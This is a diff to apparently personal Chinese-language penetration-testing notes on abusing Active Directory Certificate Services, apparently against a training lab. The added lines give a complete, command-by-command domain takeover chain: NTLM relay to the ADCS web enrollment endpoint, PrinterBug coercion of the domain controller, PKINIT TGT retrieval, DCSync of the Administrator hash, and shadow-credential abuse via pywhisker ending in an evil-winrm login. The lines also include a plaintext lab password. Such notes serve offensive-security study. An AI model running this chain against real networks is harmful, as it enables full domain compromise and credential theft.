@@ -554,28 +554,49 @@ PKINIT = 初始认证用公钥（证书）非对称加密 + 后续通信仍用�
 使用 Certipy auth 等工具，通过 PKINIT 向 KDC 申请该机器账户的 Kerberos TGT，同时返回该账户的 NTLM 哈希，接着执行 DCSync 攻击，导出域内所有用户的哈希（包括 krbtgt），完全接管域
 
 impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication      开启监听
+  https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
+使用 certipy 等工具来枚举 --template 信息 
+  https://github.com/ly4k/Certipy
+
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12      让 DC 向 监听 验证
+    https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install -r requirements.txt                                            安装 gettgtpkinit.py
+遇到 "Error detecting the version of libcrypto" 错误，安装 oscrypto 库解决
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache      获得 TGT
+
+export KRB5CCNAME=/tmp/dc.ccache
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL      DCSync 冒充 DC
 
 
-
-
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add      将受控 wwhite 用户的公钥写入 jpinkman 用户
+  https://github.com/ShutdownRepo/pywhisker
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass '写入时输出的密码' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache      获得 TGT
+sudo apt-get install krb5-user -y
+sudo nano /etc/krb5.conf                                              设置 default_realm 和 对应 kdc
+echo "SMTIP   dc01.inlanefreight.local" | sudo tee -a /etc/hosts      设置本地 IP 解析
+export KRB5CCNAME=/tmp/jpinkman.ccache
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local          登录
 
 
 没有 PKINIT？
+  https://github.com/AlmondOffSec/PassTheCert/
   https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
 
 
 
 
-Pass certificates:
-  https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
-  https://github.com/ly4k/Certipy
+ 
 
-  https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
-  https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
-    https://github.com/wbond/oscrypto
 
-  https://github.com/ShutdownRepo/pywhisker
-  https://github.com/AlmondOffSec/PassTheCert/
+
+
+  
+
 
 
 
